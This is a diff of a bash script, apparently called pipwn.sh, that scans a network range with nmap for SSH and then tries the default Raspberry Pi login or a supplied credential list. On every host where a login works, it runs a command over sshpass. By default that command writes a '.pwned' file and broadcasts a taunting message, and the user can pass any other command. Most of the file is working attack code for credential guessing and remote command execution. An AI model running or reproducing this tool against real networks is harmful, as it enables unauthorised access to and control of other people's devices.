@@ -1,5 +1,4 @@
 #!/bin/bash
-
 GREEN="\e[32m"
 RED="\e[31m"
 YELLOW="\e[33m"
@@ -16,23 +15,31 @@ if [[ -z $sshpass_installed ]]; then
     exit 1
 fi
 
+# Make sure nmap is installed
+nmap_installed=$(which nmap)
+if [[ -z $nmap_installed ]]; then
+    echo -e "$RED[-] Please install nmap first$NONE"
+    echo -e "(to do so, run 'apt-get install nmap')"
+    exit 1
+fi
+
+# Used to store nmap's output
 sploits="/tmp/vulnerable-raspies.lst"
 echo "" > $sploits
 
 if [[ $# -lt 1 ]]; then
     echo "[-] Please specify a network range (i.e. 192.168.1.0/24)"
-    echo "[-] Example: ./raspexploit.sh 192.168.1.0/24 logins.lst"
+    echo "[*] Example: ./pipwn.sh 192.168.1.0/24"
+    echo -e "[*]$BOLD EXAMPLES$NONE"
+    echo -e "[*]$BOLD ./pipwn.sh 192.168.1.0/24 credentials.lst$NONE"
+    echo "[*]   -> Will use credentials from credentials.lst (one per line)"
+    echo ""
+    echo -e "[*]$BOLD ./pipwn.sh 192.168.1.0/24 credentials.lst <CMD>$NONE"
+    echo "[*]   -> Same as above but execute <CMD> on successful login"
+    echo ""
+    echo -e "$RED[!] Please note: custom command currently only supported when list of"
+    echo -e "[!] credentials is present, too.$NONE"
     exit 1
-fi
-
-logins="pi:raspberry"
-if [[ $# == 2 ]]; then
-    logins=$(cat $2)
-    echo -e "Found$BOLD $(cat $2 | wc -l) logins$NONE in $2"
-fi
-
-if [[ $# == 3 ]]; then
-    cmd=$3
 fi
 
 function red() { echo -e "$RED$1$NONE"; }
@@ -63,8 +70,16 @@ function exit_on_problem() {
 
 banner
 
-#count=$(cat $2 | wc -l)
-#echo -e "[*] Found $BOLD$count logins$NONE"
+logins="pi:raspberry"
+if [[ $# == 2 || $# == 3 ]]; then
+    # There is a file with credentials, cat and use it
+    logins=$(cat $2)
+    echo -e "[*] Found$BOLD $(cat $2 | wc -l) logins$NONE in $2"
+fi
+
+if [[ $# == 3 ]]; then
+    cmd=$3
+fi
 
 echo -ne "[*] Scanning network $BOLD$1$NONE for possible victims..."
 nmap -sV -p22 -oG /tmp/nmap $1 >> /dev/null 2>&1
@@ -87,8 +102,6 @@ fi
 
 vulncount=0
 
-
-
 for host in $list
 do
     vuln=0
@@ -102,7 +115,8 @@ do
     	if [[ "x$?" == "x0" ]]; then
     	    green "[+] Host is vulnerable: $user:$pass"
     	    echo "$host:$user:$pass">>$sploits
-                vulncount=$(($vulncount+1))
+            vulncount=$(($vulncount+1))
+            break
     	fi
     done
 done
@@ -114,15 +128,21 @@ fi
 
 pwncount=0
 
+if [[ -z $cmd ]]; then
+    # You can add a custom command by passing it to the script
+    cmd='echo You got pwned by steps > ~/.pwned && echo Sorry, you got yourself pwned | wall >> /dev/null 2>&1'
+fi
+
+echo "[*] Trying to execute '$cmd' on remote raspberries..."
+
+
 for creds in $(cat $sploits)
 do
     h=$(echo $creds | cut -d':' -f1)
     u=$(echo $creds | cut -d':' -f2)
     p=$(echo $creds | cut -d':' -f3)
     echo -ne "[*] Attempting to pwn $h as $u..."
-    if [[ -z $cmd ]]; then
-        cmd='echo You got pwned by steps > ~/.pwned && echo Sorry, you got yourself pwned | wall >> /dev/null 2>&1'
-    fi
+        
     sshpass -p $p ssh -oStrictHostKeyChecking=no $u@$h $cmd >> /dev/null 2>&1
     if [[ "x$?" == "x0" ]]; then
         echo -ne "$GREEN$BOLD" && echo -e "PWNED$NONE"
